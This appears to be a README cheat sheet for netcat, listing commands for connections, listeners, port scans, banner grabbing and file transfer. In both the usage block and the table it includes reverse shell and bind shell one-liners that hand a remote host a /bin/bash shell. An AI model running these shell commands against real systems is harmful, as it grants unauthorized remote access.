# \U0001F50C ScottsTechX Netcat

<p align="center">
  <img src="https://img.shields.io/badge/Network-Swiss-Army-00ff88?style=for-the-badge&logo=linux&logoColor=black" alt="Netcat"/>
  <img src="https://img.shields.io/badge/Open-Source-00ff88?style=for-the-badge&logo=github&logoColor=black" alt="Open Source"/>
  <img src="https://img.shields.io/badge/TCP-UDP-00ff88?style=for-the-badge&logo=terminal&logoColor=black" alt="TCP/UDP"/>
</p>

> **The network Swiss Army knife \u2014 TCP/UDP connections, port scanning, banner grabbing, reverse shells.**

---

## \u26A1 What It Does

Netcat reads/writes across network connections using TCP/UDP \u2014 test connectivity, grab banners, open shells, transfer files, and port scan. The ultimate network debugging tool.

## \U0001F680 Quick Usage

```bash
# Connect to a remote host
nc -nv 192.168.1.100 4444

# Listen for incoming connection
nc -lvp 4444

# Port scan
nc -vnz 192.168.1.1 1-1000

# Banner grab
nc -nv 192.168.1.100 80

# Transfer file
nc -lvp 4444 > received_file.txt    # Receiver
nc 192.168.1.100 4444 < file.txt    # Sender

# Reverse shell (target)
nc -nv 10.0.0.1 4444 -e /bin/bash

# Bind shell (target)
nc -lvp 4444 -e /bin/bash
```

## \U0001F3AF Common Operations

| Command | Use Case |
|---------|---------|
| `nc -lvp 4444` | Start listener |
| `nc -e /bin/bash 10.0.0.1 4444` | Reverse shell |
| `nc -zv target 22-443` | Port scan |
| `echo "GET / HTTP/1.0" \| nc target 80` | HTTP request |
| `nc -w 3 target 25` | Test connectivity |

## \U0001F4E1 Banner Grabbing

```bash
# HTTP
nc webserver 80
GET / HTTP/1.0

# FTP
nc ftp.server 21

# SSH
nc ssh.server 22

# SMTP
nc mail.server 25
```

---

## \U0001F837 License

MIT License \u2014 [ScottsTechX](https://github.com/fredscottsbulls) \u00a9 2026
